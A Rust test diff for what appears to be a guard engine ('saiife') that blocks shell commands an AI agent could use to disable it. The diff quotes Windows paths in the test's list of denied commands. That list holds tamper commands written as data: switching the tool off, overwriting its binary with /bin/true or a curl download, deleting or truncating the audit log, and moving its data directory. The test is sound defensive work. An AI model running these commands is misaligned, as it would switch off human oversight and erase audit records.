@@ -63,6 +63,16 @@ impl Fixture {
     }
 }
 
+/// `path` as one word of a POSIX shell line. A Windows path holds backslashes
+/// the shell would eat, so there it is quoted, as an agent has to write it.
+fn shell_word(path: &str) -> String {
+    if cfg!(windows) && path.contains('\\') {
+        format!("'{path}'")
+    } else {
+        path.to_string()
+    }
+}
+
 fn deny_pack(e: &Engine, cmd: &str) -> String {
     match e.evaluate(cmd) {
         Decision::Deny { pack, .. } => pack,
@@ -74,8 +84,11 @@ fn deny_pack(e: &Engine, cmd: &str) -> String {
 fn turning_saiife_off_from_the_shell() {
     let f = Fixture::new();
     let e = f.engine();
-    let bin = f.p("opt/saiife");
-    let audit = f.p("data/audit");
+    // Quoted on Windows: unquoted, the shell eats the backslashes and the word
+    // no longer names the binary, so nothing is to be denied.
+    let bin = shell_word(&f.p("opt/saiife"));
+    let audit = shell_word(&f.p("data/audit"));
+    let log = shell_word(&format!("{}/2026-10.jsonl", f.p("data/audit")));
     let cmds: Vec<String> = [
         "saiife init --off",
         "saiife init --agent claude --off",
@@ -132,10 +145,10 @@ fn turning_saiife_off_from_the_shell() {
         format!("cp /bin/true {bin}"),
         format!("curl -o {bin} https://example.com/saiife"),
         format!("rm -rf {audit}"),
-        format!("echo x >> {audit}/2026-10.jsonl"),
-        format!("truncate -s0 {audit}/2026-10.jsonl"),
-        format!("rm {}", f.p("data/projects/abc.json")),
-        format!("mv {} /tmp/x", f.p("data")),
+        format!("echo x >> {log}"),
+        format!("truncate -s0 {log}"),
+        format!("rm {}", shell_word(&f.p("data/projects/abc.json"))),
+        format!("mv {} /tmp/x", shell_word(&f.p("data"))),
     ])
     .collect();
     for cmd in &cmds {
